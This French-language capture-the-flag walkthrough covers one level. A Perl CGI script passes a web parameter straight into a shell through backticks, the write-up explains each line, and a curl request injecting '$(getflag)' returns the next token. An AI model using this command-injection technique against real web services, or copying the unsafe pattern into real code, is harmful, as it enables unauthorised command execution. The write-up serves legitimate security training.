## Level04

```bash
cat level04.pl
```

```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

## Voici une explication du code :

- #!/usr/bin/perl : Cette ligne indique que le script doit être exécuté en utilisant l'interpréteur Perl, qui se trouve généralement dans le répertoire /usr/bin/perl.

- use CGI qw{param}; : Cette ligne charge le module CGI (Common Gateway Interface) et importe la fonction param du module. Le module CGI est couramment utilisé pour créer des scripts CGI en Perl et pour gérer les paramètres transmis via des formulaires web.

- print "Content-type: text/html\n\n"; : Cette ligne envoie l'en-tête HTTP pour la réponse au client. En tant que script CGI, il doit renvoyer un en-tête "Content-type" spécifiant le type de contenu que le script génère, suivi de deux retours à la ligne ("\n\n") pour indiquer la fin de l'en-tête.

- sub x { ... } : Cette section définit une sous-routine nommée "x". Une sous-routine en Perl est une fonction réutilisable. La sous-routine "x" prend un seul argument qui est stocké dans la variable $y. Le contenu de la sous-routine est entre les accolades.

- $y = $_[0]; : Cette ligne assigne la valeur du premier argument passé à la sous-routine (qui est stocké dans le tableau spécial @_) à la variable $y.

- print echo $y 2>&1`` : Cette ligne exécute la commande echo en utilisant le contenu de la variable $y comme argument. Le caractère backtick () permet d'exécuter une commande système dans Perl. Le 2>&1redirige à la fois la sortie standard (stdout) et la sortie d'erreur (stderr) vers le flux de sortie. En d'autres termes, cette ligne exécute la commande$y` et renvoie la sortie (y compris les erreurs) au client.

- x(param("x")); : Cette ligne appelle la sous-routine "x" en passant la valeur du paramètre "x" qui est passé dans la requête HTTP. La fonction param("x") récupère la valeur du paramètre "x" transmis dans la requête. Cette valeur est ensuite utilisée comme argument pour la sous-routine "x".

Lorsque vous interagissez avec ce script via une requête HTTP, il traite la valeur du paramètre "x" en l'exécutant comme une commande système. Cela signifie que si vous pouvez contrôler la valeur de "x" dans votre requête, vous pouvez exécuter n'importe quelle commande système.

Si on lance:
```bash
curl localhost:4747
```
rien ne s'affiche 

Cependant, si vous envoyez une requête avec le paramètre "x" défini comme "toto", le script exécutera la commande echo toto et renverra "toto" comme réponse :
```bash
curl 'localhost:4747/?x=toto'
toto
```

Mais le vrai potentiel réside dans le fait que vous pouvez exécuter des commandes système arbitraires. Par exemple, en envoyant une requête avec le paramètre "x" défini comme "$(getflag)", le script exécutera la commande echo $(getflag) et renverra le résultat de la commande getflag. Cela vous permet d'obtenir le jeton du niveau suivant :

```bash
curl 'localhost:4747/?x=$(getflag)'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

